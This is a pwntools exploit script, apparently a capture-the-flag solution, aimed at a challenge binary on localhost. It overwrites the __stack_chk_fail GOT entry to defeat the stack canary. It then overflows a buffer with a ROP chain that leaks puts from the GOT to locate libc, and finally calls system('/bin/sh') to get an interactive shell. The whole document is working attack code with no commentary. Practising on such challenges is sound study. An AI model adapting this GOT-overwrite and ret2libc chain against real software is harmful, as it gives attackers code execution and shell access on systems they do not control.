from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = remote('localhost', 4240)
#p = process('./chal')
elf = ELF('./chal')
libc = ELF('./libc.so.6')

main = elf.symbols['main']
puts = elf.symbols['puts']
puts_got = elf.got['puts']
canary_check_got = elf.got['__stack_chk_fail']
pop_rdi_ret = 0x401373
ret = 0x40101a

p.recvuntil(b'address: ')
p.sendline(str(canary_check_got))
p.recvuntil(b'Value: ')
p.sendline(str(ret))
p.recvuntil('best!')
p.sendline(b'a' * 0x38 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts) + p64(main))
p.recvuntil(b'Bye!\n')

libc.address = u64(p.recvline()[:-1].ljust(8, b'\x00')) - libc.symbols['puts']
print(hex(libc.address))

system = libc.symbols['system']
bin_sh = next(libc.search(b'/bin/sh\x00'))


p.recvuntil(b'address: ')
p.sendline(str(canary_check_got))
p.recvuntil(b'Value: ')
p.sendline(str(ret))
p.recvuntil('best!')
p.sendline(b'a' * 0x38 + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh) + p64(system))

p.interactive()
